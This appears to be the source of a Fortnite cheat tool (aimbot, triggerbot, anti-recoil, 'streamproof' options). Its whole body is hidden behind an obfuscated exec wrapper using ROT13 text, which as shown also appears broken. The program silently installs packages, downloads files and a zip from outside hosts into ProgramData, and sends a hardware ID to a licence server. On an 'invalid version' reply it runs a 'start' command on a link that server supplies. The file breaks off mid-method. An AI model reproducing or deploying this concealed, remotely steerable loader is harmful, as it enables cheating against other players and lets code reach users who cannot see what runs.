
import base64, codecs
exec(codecs.decode(base64.b64decode("vzcbeg bf
vzcbeg onfr64

bf.flfgrz("pyf")
bf.raiveba['CLTNZR_UVQR_FHCCBEG_CEBZCG'] = "uvqr"
vzcbeg flf
flf.qbag_jevgr_olgrpbqr = Gehr
vzcbeg pglcrf
vzcbeg mvcsvyr
vzcbeg heyyvo.erdhrfg
hfre32 = pglcrf.JvaQYY("hfre32")
xreary32 = pglcrf.jvaqyy.xreary32
xreary32.FrgPbafbyrZbqr(xreary32.TrgFgqUnaqyr(-10), 128)
vzcbeg gvzr
irefvba = ".".wbva(znc(fge, flf.irefvba_vasb[:3]))
vs irefvba abg va ["3.11.0", "3.11.9"]:
    vachg("[Enmbe] -> znxr fher lbh unir havafgnyyrq NYY lbhe bgure clguba irefvbaf!")
    rkvg()

pheerag_qverpgbel = bf.trgpjq()
bf.flfgrz('zbqr 80,20')
Ivfhny_Bhgyvarf = Snyfr

qrs erfgneg_cebtenz():
    cevag("[Enmbe] -> erfgnegvat, cyrnfr jnvg...")
    clguba = flf.rkrphgnoyr
    bf.rkrpi(clguba, ['clguba'] + flf.neti)

qrs vafgnyy_cebprff():
    cevag("\a[Enmbe] -> cyrnfr jnvg...\a")
    #bf.flfgrz('clguba -z cvc --ab-pnpur-qve --qvfnoyr-cvc-irefvba-purpx vafgnyy --hctenqr cvc frghcgbbyf jurry >ahy 2>&1')
    zbqhyrf = [
        "ahzcl==1.25.2",
        "cltnzr",
        "bcrapi-clguba",
        "ClDg5",
        "zff",
        "erdhrfgf",
        "zngcybgyvo --cersre-ovanel",
        "hygenylgvpf",
        "cnaqnf",
        "Cvyybj",
        "ClLNZY",
        "fpvcl",
        "frnobea",
        "gdqz",
        "cfhgvy",
        "jzv",
        "baakehagvzr==1.15",
        "baakehagvzr_tch",
        "pbzglcrf",
        "gbepu==2.3.1+ph118 -s uggcf://qbjaybnq.clgbepu.bet/juy/gbepu_fgnoyr.ugzy",
        "gbepuivfvba==0.18.1+ph118 -s uggcf://qbjaybnq.clgbepu.bet/juy/gbepu_fgnoyr.ugzy",
        "bofreinoyr",
    ]

    gbgny_zbqhyrf = yra(zbqhyrf)
    kkk = 1
    sbe zbqhyr va zbqhyrf:
        cevag(s"[Nfgeb] -> vafgnyyvat: {zbqhyr} ({vag((kkk/gbgny_zbqhyrf)*100)}%)")
        kkk+=1
        bf.flfgrz(s'cl -z cvc --ab-pnpur-qve --qvfnoyr-cvc-irefvba-purpx vafgnyy {zbqhyr} >ahy 2>&1')
        bf.flfgrz("pyf")


    #bf.flfgrz('cvc --ab-pnpur-qve --qvfnoyr-cvc-irefvba-purpx vafgnyy --hctenqr hygenylgvpf >ahy 2>&1')
    cevag("[Enmbe] -> fhpprffshyl vafgnyyrq cnpxntrf")
    cevag("\a[Enmbe] -> erfgnegvat cebtenz...")
    gvzr.fyrrc(1)
    erfgneg_cebtenz()

gel:
    vzcbeg wfba
    vzcbeg jzv
    vzcbeg gbepu
    vzcbeg hygenylgvpf
    vzcbeg zngcybgyvo
    vzcbeg cltnzr
    vzcbeg baakehagvzr
    vzcbeg pbzglcrf
    sebz ClDg5.DgPber vzcbeg Dg, DFvmr
    vzcbeg pi2
    vzcbeg wfba nf wfbaq
    vzcbeg zngu
    vzcbeg zff
    vzcbeg ahzcl nf ac
    vzcbeg gvzr
    vzcbeg jrooebjfre
    sebz hygenylgvpf vzcbeg LBYB
    vzcbeg enaqbz
    sebz ClDg5.DgJvqtrgf vzcbeg DNccyvpngvba, DJvqtrg, DYnory, DChfuOhggba, DIObkYnlbhg, DFyvqre, DUObkYnlbhg, DPurpxObk, DSenzr, DFgnpxrqJvqtrg, DPbzobObk
    sebz ClDg5.DgThv vzcbeg DCnvagre, DPbybe, DCra, DVpba, DSbag, DCvkznc, DVzntr, DSbagQngnonfr, DCnvagreCngu, DErtvba, DOehfu, DCbyltba
    sebz ClDg5.DgPber vzcbeg Dg, DGvzre, DErpgS, DErpg, DCbvag
    vzcbeg jva32pba
    vzcbeg jva32ncv
    sebz jva32svyr vzcbeg *
    sebz jva32hv vzcbeg *
    sebz jva32pba vzcbeg *
    sebz jva32thv vzcbeg *
    vzcbeg erdhrfgf
    vs bf.anzr == 'ag':
        vzcbeg jva32frphevgl
    sebz Pelcgb.Pvcure vzcbeg NRF
    sebz Pelcgb.Unfu vzcbeg FUN256
    sebz Pelcgb.Hgvy.Cnqqvat vzcbeg cnq, hacnq
    vzcbeg jva32thv
    vzcbeg guernqvat
    vzcbeg ovanfpvv
    sebz hhvq vzcbeg hhvq4
    vzcbeg unfuyvo
    vzcbeg cyngsbez
    vzcbeg qngrgvzr
    sebz qngrgvzr vzcbeg qngrgvzr
    vzcbeg fhocebprff
    vzcbeg cfhgvy
    vzcbeg fgevat
    sebz cnguyvo vzcbeg Cngu
    vzcbeg jvafbhaq
    vzcbeg cltnzr
    vzcbeg fbpxrg
    # vzcbeg dhrhr
    # vzcbeg uznp
    vzcbeg jzv
    vzcbeg pbybeflf
    vzcbeg fuhgvy
rkprcg Rkprcgvba nf r:
    cevag(r)
    vafgnyy_cebprff()

gel:
    vzcbeg rkgen.tsk.qkfubg nf orggrepnz
rkprcg:
    vzcbeg tsk.qkfubg nf orggrepnz
enaqbz_pncgvba1 = ''.wbva(enaqbz.pubvprf(fgevat.nfpvv_ybjrepnfr, x=8))
enaqbz_pncgvba2 = ''.wbva(enaqbz.pubvprf(fgevat.nfpvv_ybjrepnfr, x=8))
enaqbz_pncgvba3 = ''.wbva(enaqbz.pubvprf(fgevat.nfpvv_ybjrepnfr, x=8))
vz = [
    ('uggcf://v.voo.pb/iquZa3F/k.cat', 'P:/CebtenzQngn/AIVQVN/ATK/zbqryf/pbasvt/k.cat'),
    ('uggcf://v.voo.pb/8fTzWsM/b.cat', 'P:/CebtenzQngn/AIVQVN/ATK/zbqryf/pbasvt/b.cat'),
    ('uggcf://v.voo.pb/LuK6fKU/q.cat', 'P:/CebtenzQngn/AIVQVN/ATK/zbqryf/pbasvt/q.cat'),
    ('uggcf://ncv.irybpvgl.jf/nffrgf/Sbegavgr.ggs', 'P:/CebtenzQngn/Nfgeb/Nffrgf/Sbag.ggs')
]

sbe hey, cngu va vz: 
    qverpgbel = bf.cngu.qveanzr(cngu)
    vs abg bf.cngu.rkvfgf(qverpgbel):
        bf.znxrqvef(qverpgbel)

    vs abg bf.cngu.rkvfgf(cngu):
        jvgu erdhrfgf.trg(hey, fgernz=Gehr) nf erfcbafr, bcra(cngu, 'jo') nf svyr:
            fuhgvy.pbclsvyrbow(erfcbafr.enj, svyr)
cngu1 = e'P:\\CebtenzQngn\\Nfgeb\Nffrgf\\Vzntrf\fxhyy.cat'
cngu2 = e'P:\\CebtenzQngn\\Nfgeb\Nffrgf\\Vzntrf\fxhyy-uvtuyvtugrq.cat'

vs abg bf.cngu.rkvfgf(cngu1) be abg bf.cngu.rkvfgf(cngu2):
    cevag("[Enmbe] -> qbjaybnqvat nffrgf...")
    mvc_cngu = e'P:\CebtenzQngn\Nfgeb\Nffrgf\vzntrf.mvc'
    jvgu bcra(mvc_cngu, 'jo') nf s:
        s.jevgr(erdhrfgf.trg('uggcf://ncv.irybpvgl.jf/qbjaybnq/vzntrf').pbagrag)

    jvgu mvcsvyr.MvcSvyr(mvc_cngu, 'e') nf mvc_ers:
        mvc_ers.rkgenpgnyy(e'P:\CebtenzQngn\Nfgeb\Nffrgf')

    gel:
        bf.erzbir(mvc_cngu)
    rkprcg Rkprcgvba nf r:
        cevag(s"[Enmbe] -> reebe erzbivat mvc svyr: {r}")
# jvgu bcra('rkgen\pbasvt.wfba', 'e') nf svyr:
# 	pbasvt = wfbaq.ybnq(svyr)
# 	Sbi_Fvmr = pbasvt['Sbi_Fvmr']
# 	Pbasvqrapr = pbasvt['Pbasvqrapr']
# 	Nvz_Fzbbgu = pbasvt['Nvz_Fzbbgu']
# 	Znk_Qrgrpgvbaf = pbasvt['Znk_Qrgrpgvbaf']
# 	Nvz_Obar = pbasvt['Nvz_Obar']
# 	Ranoyr_Nvz = pbasvt['Ranoyr_Nvz']
# 	Ranoyr_Fybgf = pbasvt['Ranoyr_Fybgf']
# 	Pbagebyyre_Ba = pbasvt['Pbagebyyre_Ba']
# 	Xrlovaq = pbasvt['Xrlovaq']
# 	Xrlovaq2 = pbasvt['Xrlovaq2']
# 	Ranoyr_GevttreObg = pbasvt['Ranoyr_GevttreObg']
# 	Fubj_Sbi = pbasvt['Fubj_Sbi']
# 	Fubj_Pebffunve = pbasvt['Fubj_Pebffunve']
# 	Fubj_Qroht = pbasvt['Fubj_Qroht']
# 	Nhgb_Sver_Sbi_Fvmr = pbasvt['Nhgb_Sver_Sbi_Fvmr']
# 	Fubj_Qrgrpgvbaf = pbasvt['Fubj_Qrgrpgvbaf']
# 	Fubj_Nvzyvar = pbasvt['Fubj_Nvzyvar']
# 	Nhgb_Sver_Pbasvqrapr = pbasvt['Nhgb_Sver_Pbasvqrapr']
# 	Nhgb_Sver_Xrlovaq = pbasvt['Nhgb_Sver_Xrlovaq']
# 	Erdhver_Xrlovaq = pbasvt['Erdhver_Xrlovaq']
# 	Hfr_Uhr = pbasvt['Hfr_Uhr']
# 	PhcZbqr_Ba = pbasvt['PhcZbqr_Ba']
# 	Erqhpr_Oybbz = pbasvt['Erqhpr_Oybbz']
# 	Erdhver_NQF = pbasvt['Erdhver_NQF']
# 	NagvErpbvy_Ba = pbasvt['NagvErpbvy_Ba']
# 	NagvErpbvy_Fgeratgu = pbasvt['NagvErpbvy_Fgeratgu']
# 	Gurzr_Urk_Pbybe = pbasvt['Gurzr_Urk_Pbybe']
# 	Ranoyr_Syvpx_Obg = pbasvt['Ranoyr_Syvpx_Obg']
# 	Syvpx_Fpbcr_Fraf = pbasvt['Syvpx_Fpbcr_Fraf']
# 	Syvpx_Pbbyqbja = pbasvt['Syvpx_Pbbyqbja']
# 	Syvpx_Qrynl = pbasvt['Syvpx_Qrynl']
# 	Syvpxobg_Xrlovaq = pbasvt['Syvpxobg_Xrlovaq']

# 	Ranoyr_Nvz_Fybg1 = pbasvt['Ranoyr_Nvz_Fybg1']
# 	Ranoyr_Nvz_Fybg2 = pbasvt['Ranoyr_Nvz_Fybg2']
# 	Ranoyr_Nvz_Fybg3 = pbasvt['Ranoyr_Nvz_Fybg3']
# 	Ranoyr_Nvz_Fybg4 = pbasvt['Ranoyr_Nvz_Fybg4']
# 	Ranoyr_Nvz_Fybg5 = pbasvt['Ranoyr_Nvz_Fybg5']

# 	Fybg1_Xrlovaq = pbasvt['Fybg1_Xrlovaq']
# 	Fybg2_Xrlovaq = pbasvt['Fybg2_Xrlovaq']
# 	Fybg3_Xrlovaq = pbasvt['Fybg3_Xrlovaq']
# 	Fybg4_Xrlovaq = pbasvt['Fybg4_Xrlovaq']
# 	Fybg5_Xrlovaq = pbasvt['Fybg5_Xrlovaq']
# 	Fybg6_Xrlovaq = pbasvt['Fybg6_Xrlovaq']

# 	Sbi_Fvmr_Fybg1 = pbasvt['Sbi_Fvmr_Fybg1']
# 	Sbi_Fvmr_Fybg2 = pbasvt['Sbi_Fvmr_Fybg2']
# 	Sbi_Fvmr_Fybg3 = pbasvt['Sbi_Fvmr_Fybg3']
# 	Sbi_Fvmr_Fybg4 = pbasvt['Sbi_Fvmr_Fybg4']
# 	Sbi_Fvmr_Fybg5 = pbasvt['Sbi_Fvmr_Fybg5']

# 	ETOBY_Inyhr = pbasvt['ETON_Inyhr']
# 	erqe2q2 = ETOBY_Inyhr['erq']
# 	terrae2q2 = ETOBY_Inyhr['terra']
# 	oyhre2q2 = ETOBY_Inyhr['oyhr']
# 	pbas_bcnpvgl = ETOBY_Inyhr['bcnpvgl']
# 	pbas_yvtugarff = ETOBY_Inyhr['yvtugarff']
# 	Hfr_Zbqry_Pynff = pbasvt['Hfr_Zbqry_Pynff']
# 	Vzt_Inyhr = pbasvt['Vzt_Inyhr']
# 	Zbqry_SCF = pbasvt['Zbqry_SCF']
# 	Ynfg_Zbqry = pbasvt['Ynfg_Zbqry']
gel:
    svyr = bcra('./pbasvt.wfba')
    pbasvt = wfbaq.ybnq(svyr)
    Sbi_Fvmr = pbasvt['Sbi_Fvmr']
    Pbasvqrapr = pbasvt['Pbasvqrapr']
    Nvz_Fzbbgu = pbasvt['Nvz_Fzbbgu']
    Znk_Qrgrpgvbaf = pbasvt['Znk_Qrgrpgvbaf']
    Nvz_Obar = pbasvt['Nvz_Obar']
    Fzbbguvat_Glcr = pbasvt['Fzbbguvat_Glcr']
    Obk_glcr = pbasvt['Obk_glcr']
    Ranoyr_Nvz = pbasvt['Ranoyr_Nvz']
    Ranoyr_Fybgf = pbasvt['Ranoyr_Fybgf']
    Pbagebyyre_Ba = pbasvt['Pbagebyyre_Ba']
    Xrlovaq = pbasvt['Xrlovaq']
    Xrlovaq2 = pbasvt['Xrlovaq2']
    Ranoyr_GevttreObg = pbasvt['Ranoyr_GevttreObg']
    Fubj_Sbi = pbasvt['Fubj_Sbi']
    Fubj_Pebffunve = pbasvt['Fubj_Pebffunve']
    Fubj_Qroht = pbasvt['Fubj_Qroht']
    Fubj_SCF = pbasvt['Fubj_SCF']
    Nhgb_Sver_Sbi_Fvmr = pbasvt['Nhgb_Sver_Sbi_Fvmr']
    Fubj_Qrgrpgvbaf = pbasvt['Fubj_Qrgrpgvbaf']
    Fubj_Nvzyvar = pbasvt['Fubj_Nvzyvar']
    Nhgb_Sver_Pbasvqrapr = pbasvt['Nhgb_Sver_Pbasvqrapr']
    Nhgb_Sver_Xrlovaq = pbasvt['Nhgb_Sver_Xrlovaq']
    Erdhver_Xrlovaq = pbasvt['Erdhver_Xrlovaq']
    Hfr_Uhr = pbasvt['Hfr_Uhr']
    PhcZbqr_Ba = pbasvt['PhcZbqr_Ba']
    Erqhpr_Oybbz = pbasvt['Erqhpr_Oybbz']
    Erdhver_NQF = pbasvt['Erdhver_NQF']
    NagvErpbvy_Ba = pbasvt['NagvErpbvy_Ba']
    NagvErpbvy_Fgeratgu = pbasvt['NagvErpbvy_Fgeratgu']
    #Gurzr_Urk_Pbybe = pbasvt['Gurzr_Urk_Pbybe']
    Ranoyr_Syvpx_Obg = pbasvt['Ranoyr_Syvpx_Obg']
    Syvpx_Fpbcr_Fraf = pbasvt['Syvpx_Fpbcr_Fraf']
    Syvpx_Pbbyqbja = pbasvt['Syvpx_Pbbyqbja']
    Syvpx_Qrynl = pbasvt['Syvpx_Qrynl']
    Syvpxobg_Xrlovaq = pbasvt['Syvpxobg_Xrlovaq']
    Fgernzcebbs = Snyfr
    Ranoyr_Nvz_Fybg1 = pbasvt['Ranoyr_Nvz_Fybg1']
    Ranoyr_Nvz_Fybg2 = pbasvt['Ranoyr_Nvz_Fybg2']
    Ranoyr_Nvz_Fybg3 = pbasvt['Ranoyr_Nvz_Fybg3']
    Ranoyr_Nvz_Fybg4 = pbasvt['Ranoyr_Nvz_Fybg4']
    Ranoyr_Nvz_Fybg5 = pbasvt['Ranoyr_Nvz_Fybg5']
    Fybg1_Xrlovaq = pbasvt['Fybg1_Xrlovaq']
    Fybg2_Xrlovaq = pbasvt['Fybg2_Xrlovaq']
    Fybg3_Xrlovaq = pbasvt['Fybg3_Xrlovaq']
    Fybg4_Xrlovaq = pbasvt['Fybg4_Xrlovaq']
    Fybg5_Xrlovaq = pbasvt['Fybg5_Xrlovaq']
    Fybg6_Xrlovaq = pbasvt['Fybg6_Xrlovaq']
    Sbi_Fvmr_Fybg1 = pbasvt['Sbi_Fvmr_Fybg1']
    Sbi_Fvmr_Fybg2 = pbasvt['Sbi_Fvmr_Fybg2']
    Sbi_Fvmr_Fybg3 = pbasvt['Sbi_Fvmr_Fybg3']
    Sbi_Fvmr_Fybg4 = pbasvt['Sbi_Fvmr_Fybg4']
    Sbi_Fvmr_Fybg5 = pbasvt['Sbi_Fvmr_Fybg5']

    Hfr_Zbqry_Pynff = pbasvt['Hfr_Zbqry_Pynff']
    Vzt_Inyhr = pbasvt['Vzt_Inyhr']
    Zbqry_SCF = pbasvt['Zbqry_SCF']
    Ynfg_Zbqry = pbasvt['Ynfg_Zbqry']
rkprcg Rkprcgvba nf r:
    bf.znxrqvef('./', rkvfg_bx=Gehr)
    jvgu bcra('./pbasvt.wfba', 'j') nf svyr:
        wfbaq.qhzc({
    "Sbi_Fvmr": 350,
    "Pbasvqrapr": 75,
    "Nvz_Fzbbgu": 80,
    "Znk_Qrgrpgvbaf": 1,
    "Nvz_Obar": "Urnq",
    "Fzbbguvat_Glcr": "Qrsnhyg",
    "Obk_glcr": "Erthyne",
    "Ranoyr_Nvz": Snyfr,
    "Ranoyr_Fybgf": Snyfr,
    "Pbagebyyre_Ba": Snyfr,
    "Xrlovaq": 6,
    "Xrlovaq2": 80,
    "Ranoyr_GevttreObg": Snyfr,
    "Fubj_Sbi": Snyfr,
    "Fubj_Pebffunve": Snyfr,
    "Fubj_Qroht": Snyfr,
    "Fubj_SCF": Snyfr,
    "Nhgb_Sver_Sbi_Fvmr": 20,
    "Fubj_Qrgrpgvbaf": Snyfr,
    "Fubj_Nvzyvar": Snyfr,
    "Nhgb_Sver_Pbasvqrapr": 60,
    "Nhgb_Sver_Xrlovaq": 6,
    "Erdhver_Xrlovaq": Snyfr,
    "Hfr_Uhr": Snyfr,
    "PhcZbqr_Ba": Snyfr,
    "Erqhpr_Oybbz": Snyfr,
    "Erdhver_NQF": Snyfr,
    "NagvErpbvy_Ba": Snyfr,
    "NagvErpbvy_Fgeratgu": 1,
    "Gurzr_Urk_Pbybe": "#717sq1",
    "Ranoyr_Syvpx_Obg": Snyfr,
    "Syvpx_Fpbcr_Fraf": 50,
    "Syvpx_Pbbyqbja": 0.25,
    "Syvpx_Qrynl": 0.003,
    "Syvpxobg_Xrlovaq": 5,
    "Fgernzcebbs": Snyfr,
    "Ranoyr_Nvz_Fybg1": Snyfr,
    "Ranoyr_Nvz_Fybg2": Snyfr,
    "Ranoyr_Nvz_Fybg3": Snyfr,
    "Ranoyr_Nvz_Fybg4": Snyfr,
    "Ranoyr_Nvz_Fybg5": Snyfr,
    "Fybg1_Xrlovaq": 49,
    "Fybg2_Xrlovaq": 50,
    "Fybg3_Xrlovaq": 51,
    "Fybg4_Xrlovaq": 52,
    "Fybg5_Xrlovaq": 53,
    "Fybg6_Xrlovaq": 80,
    "Sbi_Fvmr_Fybg1": 800,
    "Sbi_Fvmr_Fybg2": 120,
    "Sbi_Fvmr_Fybg3": 800,
    "Sbi_Fvmr_Fybg4": 120,
    "Sbi_Fvmr_Fybg5": 800,
    "Hfr_Zbqry_Pynff": Gehr,
    "Vzt_Inyhr": "640",
    "Zbqry_SCF": 165,
    "Ynfg_Zbqry": "Sbegavgr.cg",
    "tnzr": {
        "cvkry_vaperzrag": 1000,
        "enaqbzarff": 0.25,
        "frafvgvivgl": 0.005,
        "qvfgnapr_gb_fpnyr": 100,
        "qbag_ynhapu_bireynlf": 0,
        "hfr_zff": 0,
        "uvqr_znfxf": 0
    }
}, svyr, vaqrag=4)
# ETOBY_Inyhr = pbasvt['ETON_Inyhr']
# erqe2q2 = ETOBY_Inyhr['erq']
# terrae2q2 = ETOBY_Inyhr['terra']
# oyhre2q2 = ETOBY_Inyhr['oyhr']

#FRPERG PBASVT
frpergsvyr = bcra('./pbasvt.wfba')
frpergpbasvt = wfbaq.ybnq(frpergsvyr)["tnzr"]
cvkry_vaperzrag = frpergpbasvt['cvkry_vaperzrag']
enaqbzarff = frpergpbasvt['enaqbzarff']
frafvgvivgl = frpergpbasvt['frafvgvivgl']
qvfgnapr_gb_fpnyr = frpergpbasvt['qvfgnapr_gb_fpnyr']
qbag_ynhapu_bireynlf = frpergpbasvt['qbag_ynhapu_bireynlf']
hfr_zff = frpergpbasvt['hfr_zff']
uvqr_znfxf = frpergpbasvt['uvqr_znfxf']

fperrafvmr = {'K':pglcrf.jvaqyy.hfre32.TrgFlfgrzZrgevpf(0),'L':pglcrf.jvaqyy.hfre32.TrgFlfgrzZrgevpf(1)}
fperra_erf_K = fperrafvmr['K']
fperra_erf_L = fperrafvmr['L']
fperra_k = vag(fperra_erf_K /2)
fperra_l = vag(fperra_erf_L /2)


pynff ncv:
    qrs __vavg__(frys, anzr, bjarevq, frperg, irefvba):
        frys.anzr = anzr
        frys.bjarevq = bjarevq
        frys.frperg = frperg
        frys.irefvba = irefvba
        cevag(s"[+] pbarpgvat gb nhgu freire ")
        frys.vavg()

    frffvbavq = ""
    rapxrl = ""
    vavgvnyvmrq = Snyfr

    qrs vavg(frys):
        vs frys.frffvbavq != "":
            cnff
        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        frys.rapxrl = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl("vavg".rapbqr()),
            "ire": rapelcgvba.rapelcg(frys.irefvba, frys.frperg, vavg_vi),
            "rapxrl": rapelcgvba.rapelcg(frys.rapxrl, frys.frperg, vavg_vi),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        vs erfcbafr == "Nhgu_Vainyvq":
            cevag("Gur nccyvpngvba qbrfa'g rkvfg")
            bf._rkvg(1)
        erfcbafr = rapelcgvba.qrpelcg(erfcbafr, frys.frperg, vavg_vi)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        vs wfba_qngn["zrffntr"] == "vainyvqire":
            vs wfba_qngn["qbjaybnq"] != "":
                pglcrf.jvaqyy.hfre32.ZrffntrObkJ(0, "Cyrnfr vafgnyy gur arjrfg hcqngr.", "Bhg-qngrq Irefvba!", 64)
                qbjaybnq_yvax = wfba_qngn["qbjaybnq"]
                bf.flfgrz(s"fgneg {qbjaybnq_yvax}")
                bf._rkvg(1)
            ryfr:
                cevag("Vainyvq Irefvba, Pbagnpg bjare gb nqq qbjaybnq yvax gb yngrfg ncc irefvba")
                bf._rkvg(1)
        vs abg wfba_qngn["fhpprff"]:
            cevag(wfba_qngn["zrffntr"])
            bf._rkvg(1)
        frys.frffvbavq = wfba_qngn["frffvbavq"]
        frys.vavgvnyvmrq = Gehr
        frys.__ybnq_ncc_qngn(wfba_qngn["nccvasb"])

    qrs ertvfgre(frys, hfre, cnffjbeq, yvprafr, ujvq=Abar):
        frys.purpxvavg()
        vs ujvq vf Abar:
            ujvq = bguref.trg_ujvq()
        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl("ertvfgre".rapbqr()),
            "hfreanzr": rapelcgvba.rapelcg(hfre, frys.rapxrl, vavg_vi),
            "cnff": rapelcgvba.rapelcg(cnffjbeq, frys.rapxrl, vavg_vi),
            "xrl": rapelcgvba.rapelcg(yvprafr, frys.rapxrl, vavg_vi),
            "ujvq": rapelcgvba.rapelcg(ujvq, frys.rapxrl, vavg_vi),
            "frffvbavq": ovanfpvv.urkyvsl(frys.frffvbavq.rapbqr()),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        erfcbafr = rapelcgvba.qrpelcg(erfcbafr, frys.rapxrl, vavg_vi)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        vs wfba_qngn["fhpprff"]:
            cevag("fhpprffshyyl ertvfgrerq")
            frys.__ybnq_hfre_qngn(wfba_qngn["vasb"])
        ryfr:
            cevag(wfba_qngn["zrffntr"])
            bf._rkvg(1)

    qrs hctenqr(frys, hfre, yvprafr):
        frys.purpxvavg()
        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl("hctenqr".rapbqr()),
            "hfreanzr": rapelcgvba.rapelcg(hfre, frys.rapxrl, vavg_vi),
            "xrl": rapelcgvba.rapelcg(yvprafr, frys.rapxrl, vavg_vi),
            "frffvbavq": ovanfpvv.urkyvsl(frys.frffvbavq.rapbqr()),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        erfcbafr = rapelcgvba.qrpelcg(erfcbafr, frys.rapxrl, vavg_vi)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        vs wfba_qngn["fhpprff"]:
            cevag("fhpprffshyyl hctenqrq hfre")
            cevag("cyrnfr erfgneg cebtenz naq ybtva")
            gvzr.fyrrc(2)
            bf._rkvg(1)
        ryfr:
            cevag(wfba_qngn["zrffntr"])
            bf._rkvg(1)

    qrs ybtva(frys, hfre, cnffjbeq, ujvq=Abar):
        frys.purpxvavg()
        vs ujvq vf Abar:
            ujvq = bguref.trg_ujvq()
        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl("ybtva".rapbqr()),
            "hfreanzr": rapelcgvba.rapelcg(hfre, frys.rapxrl, vavg_vi),
            "cnff": rapelcgvba.rapelcg(cnffjbeq, frys.rapxrl, vavg_vi),
            "ujvq": rapelcgvba.rapelcg(ujvq, frys.rapxrl, vavg_vi),
            "frffvbavq": ovanfpvv.urkyvsl(frys.frffvbavq.rapbqr()),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        erfcbafr = rapelcgvba.qrpelcg(erfcbafr, frys.rapxrl, vavg_vi)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        vs wfba_qngn["fhpprff"]:
            frys.__ybnq_hfre_qngn(wfba_qngn["vasb"])
            cevag("fhpprffshyyl ybttrq va")
        ryfr:
            cevag(wfba_qngn["zrffntr"])
            bf._rkvg(1)

    qrs yvprafr(frys, xrl, ujvq=Abar):
        frys.purpxvavg()
        vs ujvq vf Abar:
            ujvq = bguref.trg_ujvq()
        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl("yvprafr".rapbqr()),
            "xrl": rapelcgvba.rapelcg(xrl, frys.rapxrl, vavg_vi),
            "ujvq": rapelcgvba.rapelcg(ujvq, frys.rapxrl, vavg_vi),
            "frffvbavq": ovanfpvv.urkyvsl(frys.frffvbavq.rapbqr()),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        erfcbafr = rapelcgvba.qrpelcg(erfcbafr, frys.rapxrl, vavg_vi)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        cevag(s"[Enmbe] -> {wfba_qngn['zrffntr']}")
        vs wfba_qngn["fhpprff"]:
            gel:
                frys.__ybnq_hfre_qngn(wfba_qngn["vasb"])
            rkprcg:
                rkvg(99)
            cevag("\a[Enmbe] -> ynhapuvat...")
            tybony kkkk
            kkkk = Nv992()
            kkkk.fgneg()

    qrs ine(frys, anzr):
        frys.purpxvavg()
        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl("ine".rapbqr()),
            "inevq": rapelcgvba.rapelcg(anzr, frys.rapxrl, vavg_vi),
            "frffvbavq": ovanfpvv.urkyvsl(frys.frffvbavq.rapbqr()),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        erfcbafr = rapelcgvba.qrpelcg(erfcbafr, frys.rapxrl, vavg_vi)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        vs wfba_qngn["fhpprff"]:
            erghea wfba_qngn["zrffntr"]
        ryfr:
            cevag(wfba_qngn["zrffntr"])
            gvzr.fyrrc(5)
            bf._rkvg(1)

    qrs trgine(frys, ine_anzr):
        frys.purpxvavg()
        vavg_vi = FUN256.arj(fge(hhvq4())[:8].rapbqr()).urkqvtrfg()
        cbfg_qngn = {
            "glcr": ovanfpvv.urkyvsl("trgine".rapbqr()),
            "ine": rapelcgvba.rapelcg(ine_anzr, frys.rapxrl, vavg_vi),
            "frffvbavq": ovanfpvv.urkyvsl(frys.frffvbavq.rapbqr()),
            "anzr": ovanfpvv.urkyvsl(frys.anzr.rapbqr()),
            "bjarevq": ovanfpvv.urkyvsl(frys.bjarevq.rapbqr()),
            "vavg_vi": vavg_vi
        }
        erfcbafr = frys.__qb_erdhrfg(cbfg_qngn)
        erfcbafr = rapelcgvba.qrpelcg(erfcbafr, frys.rapxrl, vavg_vi)
        wfba_qngn = wfba.ybnqf(erfcbafr)
        vs wfba_qngn["fhpprff"]:
            erghea wfba_qngn["erfcbafr"]
        ryfr:
            cevag(wfba_qngn["zrffntr"])
            gvzr.fyrrc(5)
            bf._rkvg(1)

    qrs frgine(frys, ine_anzr, ine_qngn):
        frys.purpxvavg()
